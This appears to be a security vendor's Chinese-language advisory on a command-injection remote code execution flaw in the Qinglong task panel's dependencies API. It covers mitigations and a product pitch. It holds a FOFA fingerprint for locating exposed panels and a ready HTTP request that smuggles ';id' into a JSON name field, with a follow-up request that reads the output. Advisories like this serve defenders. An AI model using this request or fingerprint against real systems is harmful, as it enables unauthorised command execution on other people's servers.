#  【漏洞预警】青龙面板 网站管理系统 dependencies 远程代码执行漏洞  
by 融云安全-sm
                    by 融云安全-sm  融云攻防实验室   2026-03-06 07:10  
  
漏洞名称：  
  
青龙面板 网站管理系统 dependencies 远程代码执行漏洞  
  
**组件详情：**  
  
青龙面板是一款支持 Python3、JavaScript、Shell、Typescript 等多种脚本语言的定时任务管理平台，广泛用于自动化任务调度与管理。其后台管理接口默认监听 5700 端口，提供 Web 操作界面和 API 服务。该漏洞存在于依赖管理功能的 dependencies 接口中。  
  
**漏洞类型：**  
  
命令注入  
  
**利用条件：**  
  
1.用户认证：需要普通用户权限  
  
2.前置条件：默认配置  
  
3.触发方式：远程，通过 HTTP 请求访问 dependencies 接口  
  
**综合评价：**  
  
1.综合评定利用难度：一般，需要普通用户权限。  
  
2.综合评定威胁等级：高危，登录后可造成远程命令执行。  
  
**官方解决方案：**  
  
1.临时措施：如无法立即升级，建议加强对 dependencies 接口的访问控制，仅允许可信 IP 访问  
  
2.权限最小化：避免使用默认口令，严格控制用户权限分配  
  
3.日志监控：加强对 dependencies 接口的访问日志监控，及时发现异常行为  
  
  
  
**复现情况**  
  
  
f  
ofa  
：  
icon_hash=="-254502902"  
  
  
1.执行id命令访问未授权接口得到结果  
```
POST /Api/dependencies HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Content-Length: 47
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
[
  {
   "name": ";id",
   "type": 0
  }
]
```  
```
GET /Api/dependencies HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: application/json
```  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrgIKk6jTsXCXyzhHeZ2ibKP0knRAx53eK0YN5vlR74v3ufFpU53YHR7iaHmLdfopw1uPY1lYNoLrTB7yncEG8B6kCTptKZAtt7ns/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=1 "")  
  
2.渝融云NTM入侵检测系统已支持青龙面板攻击检测  
（入侵检测合作可私聊公众号）  
  
![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/RQ1ibJdI2zrjiciaTxblSQhNFRbPrFPam3LHZafQLqDLMGtmVlicr0iblNzHqQOicDkrb8OXX7RRn23W6IqJHylcsRhsJjbqK1yWvVq4npzYaGjWY/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1#imgIndex=2 "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrhem9TShlxnUFDZWpLAib0rKz6ZoORMqyWGHbiaRb8pNHHoKu8W465OaeyibOp7fqhqUSt9Tic3xGCz5iaH2aLlPy5q9uGb3wy3eibIw/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1&watermark=1#imgIndex=3 "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/w8NHw6tcQ5wicTzaxopgE26TXk6BicVDCkRV2P7zLEqkMiarB6Gq7gwAfxowKPPDGI0iahiaOkO55LooibEGtWxj9Biag/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=6 "")  
  
**渝融云解决方案-渝融云NTM全流量分析探针**  
  
**已添加监测规则**  
，可实时监控  
青龙面板 网站管理系统 dependencies 远程代码执行漏洞  
  
设备简介：渝融云NTM全流量分析探针是一款集流量分析、威胁检测与行为审计于一体的智能化网络流量监测平台。系统通过对网络全流量的实时采集与深度解析，帮助用户实现网络态势的“全景透视”。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/RQ1ibJdI2zrhUZLk5LgZZ7GFMqWibn7KnyXHIR2n17wPnebaS7ZKFibZw3TmR2quJTNUXZKLfZ8FVDyicGNMSJMNTHlOZa7EEjibYibpyZnLVfFNc/640?wx_fmt=png&from=appmsg&watermark=1&wxfrom=5&wx_lazy=1&tp=webp#imgIndex=4 "")  
  
